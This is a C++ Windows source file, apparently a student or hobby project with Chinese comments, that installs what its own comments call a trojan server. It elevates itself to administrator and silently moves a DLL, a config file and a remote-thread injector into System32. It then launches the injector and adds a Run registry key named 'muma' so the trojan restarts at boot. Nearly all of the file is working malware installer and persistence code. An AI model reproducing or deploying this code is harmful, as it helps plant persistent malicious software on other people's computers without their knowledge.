// demo.cpp : 此文件包含 "main" 函数。程序执行将在此处开始并结束。
//

#include <stdio.h>
#include<vector>
#include<iostream>
#include <fstream> 
#include <stdint.h>

#include <Winsock2.h>
#include<WS2tcpip.h>
#include<Windows.h>
#include<TlHelp32.h>
#include<direct.h>
#pragma comment(lib, "WS2_32")  // 链接到WS2_32.lib
using namespace std;
//the files ready to be installed on system directory;
//these three files is in the same directory with this installation program
#define DLLFILEPATH "DLL1.dll"
#define CONFIGFILEPATH "config.txt"
#define INJECTPROGRAM "remoteThreadDemo.exe"
BOOL IsRunAsAdmin();
BOOL ElevateCurrentProcess();
std::string execute(string cmd);
void changeReg();
int main()
{
    if (!IsRunAsAdmin()) {
        ElevateCurrentProcess();
        return 1;
    }
    //拼接命令
    //执行命令
    //string cmd = "";
    //cmd.append("cmd.exe /c move ")
    string cmd1, cmd2, cmd3,cmd="";
    cmd1 = "move ";
    cmd1.append(DLLFILEPATH);
    cmd1.append(" C:\\Windows\\System32\\");
    cmd1.append(DLLFILEPATH);
    cmd2 = "move ";
    cmd2.append(CONFIGFILEPATH);
    cmd2.append(" C:\\Windows\\System32\\");
    cmd2.append(CONFIGFILEPATH);
    cmd3 = "move ";
    cmd3.append(INJECTPROGRAM);
    cmd3.append(" C:\\Windows\\System32\\");
    cmd3.append(INJECTPROGRAM);
    cmd.append("cmd.exe /c ");
    cmd.append(cmd1);
    cmd.append("&&");
    cmd.append(cmd2);
    cmd.append("&&");
    cmd.append(cmd3);
    cout << execute(cmd) << endl;
    //首次启动木马服务端
    cmd = INJECTPROGRAM;
    execute(cmd);
    //更改注册表，开机启动
    cout << "change reg" << endl;
    cmd = "cmd.exe /c reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run \
        /v muma /t REG_SZ /d C:\\Windows\\System32\\";
        //remoteThreadDemo.exe /f";
    cmd.append(INJECTPROGRAM);
    cmd.append(" /f");
    cout << execute(cmd) << endl;
    system("pause");
    return 0;
    
}

// 运行程序: Ctrl + F5 或调试 >“开始执行(不调试)”菜单
// 调试程序: F5 或调试 >“开始调试”菜单

// 入门使用技巧: 
//   1. 使用解决方案资源管理器窗口添加/管理文件
//   2. 使用团队资源管理器窗口连接到源代码管理
//   3. 使用输出窗口查看生成输出和其他消息
//   4. 使用错误列表窗口查看错误
//   5. 转到“项目”>“添加新项”以创建新的代码文件，或转到“项目”>“添加现有项”以将现有代码文件添加到项目
//   6. 将来，若要再次打开此项目，请转到“文件”>“打开”>“项目”并选择 .sln 文件

BOOL IsRunAsAdmin()
{
    BOOL fIsRunAsAdmin = FALSE;
    DWORD dwError = ERROR_SUCCESS;
    PSID pAdministratorsGroup = NULL;

    // Allocate and initialize a SID of the administrators group.  
    SID_IDENTIFIER_AUTHORITY NtAuthority = SECURITY_NT_AUTHORITY;
    if (!AllocateAndInitializeSid(
        &NtAuthority,
        2,
        SECURITY_BUILTIN_DOMAIN_RID,
        DOMAIN_ALIAS_RID_ADMINS,
        0, 0, 0, 0, 0, 0,
        &pAdministratorsGroup))
    {
        dwError = GetLastError();
        goto Cleanup;
    }

    // Determine whether the SID of administrators group is enabled in   
    // the primary access token of the process.  
    if (!CheckTokenMembership(NULL, pAdministratorsGroup, &fIsRunAsAdmin)) {
        dwError = GetLastError();
        goto Cleanup;
    }

Cleanup:
    // Centralized cleanup for all allocated resources.  
    if (pAdministratorsGroup) {
        FreeSid(pAdministratorsGroup);
        pAdministratorsGroup = NULL;
    }

    // Throw the error if something failed in the function.  
    if (ERROR_SUCCESS != dwError) {
        throw dwError;
    }

    return fIsRunAsAdmin;
}
std::string execute(string cmd)
{
    // 创建匿名管道
    SECURITY_ATTRIBUTES sa = { sizeof(SECURITY_ATTRIBUTES), NULL, TRUE };
    HANDLE hRead, hWrite;
    if (!CreatePipe(&hRead, &hWrite, &sa, 0))
    {
        return "";
    }

    LPCSTR pszSrc = cmd.c_str();
    int nLen = MultiByteToWideChar(CP_ACP, 0, cmd.c_str(), -1, NULL, 0);
    if (nLen == 0)
        return ("");

    wchar_t* pwszDst = new wchar_t[nLen];
    if (!pwszDst)
        return ("");

    MultiByteToWideChar(CP_ACP, 0, pszSrc, -1, pwszDst, nLen);
    std::wstring pszCmd(pwszDst);
    delete[] pwszDst;
    pwszDst = NULL;


    // 设置命令行进程启动信息(以隐藏方式启动命令并定位其输出到hWrite
    STARTUPINFO si = { sizeof(STARTUPINFO) };
    GetStartupInfo(&si);
    si.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;
    si.wShowWindow = SW_HIDE;
    si.hStdError = hWrite;
    si.hStdOutput = hWrite;

    // 启动命令行
    PROCESS_INFORMATION pi;
    if (!CreateProcess(NULL, (LPWSTR)pszCmd.c_str(), NULL, NULL, TRUE, NULL, NULL, NULL, &si, &pi))
    {

        return ("Cannot create process");
    }

    // 立即关闭hWrite
    CloseHandle(hWrite);
    //wait for process to exit
    WaitForSingleObject(pi.hProcess, 5000);

    // 读取命令行返回值
    std::string strRetTmp;
    char buff[1024] = { 0 };
    DWORD dwRead = 0;
    //memset(buff, sizeof(buff), 0);
    strRetTmp = "";
    while (ReadFile(hRead, buff, 1023, &dwRead, NULL))
    {
        cout << "*" << buff << endl;
        strRetTmp.append(buff);
        if (strlen(buff) < 1000)break;
        memset(buff, 0, sizeof(buff));
    }
    //strRetTmp.append(buff);
    CloseHandle(hRead);
    cout << "result before trans to wide string*" << strRetTmp << "*\n";

    return strRetTmp;
}

BOOL ElevateCurrentProcess()
{
    //USES_CONVERSION;
    TCHAR szPath[MAX_PATH] = { 0 };
    if (::GetModuleFileName(NULL, szPath, MAX_PATH)) {
        // Launch itself as administrator.  
        SHELLEXECUTEINFO sei = { sizeof(SHELLEXECUTEINFO) };
        sei.lpVerb = L"runas";
        sei.lpFile = szPath;
      
        //sei.lpParameters = (LPCTSTR)sCmdLine;
        //  sei.hwnd = hWnd;  
        sei.nShow = SW_SHOWNORMAL;

        if (!ShellExecuteEx(&sei)) {
            DWORD dwStatus = GetLastError();
            if (dwStatus == ERROR_CANCELLED) {
                return FALSE;
            }
            else if (dwStatus == ERROR_FILE_NOT_FOUND) {
                return FALSE;
            }
            return FALSE;
        }
        return TRUE;
    }
    return FALSE;
}
void changeReg() {
    HKEY hKEY;
    
    LPCTSTR data_Set = L"Software\\Microsoft\\Windows\\CurrentVersion\\Run";
    //regopenkeyex
    long ret0 = ::RegOpenKeyEx(HKEY_LOCAL_MACHINE, data_Set, 0, KEY_READ, &hKEY);
    if(ret0 != ERROR_SUCCESS) {
        cout << "open key error"<<ret0<<"\t" <<GetLastError()<< endl;
        return;
    }
    LPBYTE res = new BYTE[200];
    DWORD type_1 = REG_SZ;
    DWORD cbData_1 = 199;
    ret0 = ::RegQueryValueEx(hKEY, L"RTHDVCPL", NULL, &type_1, res, &cbData_1);
    
    if (ret0 != ERROR_SUCCESS) {
        cout << "cannot query reg info" << endl;
    }
    cout << cbData_1 << endl;
    cout << res << endl;
    char resch[200];
    memcpy_s(resch, 200, res, 200);
    cout << "*"<<resch<<"*" << endl;
}
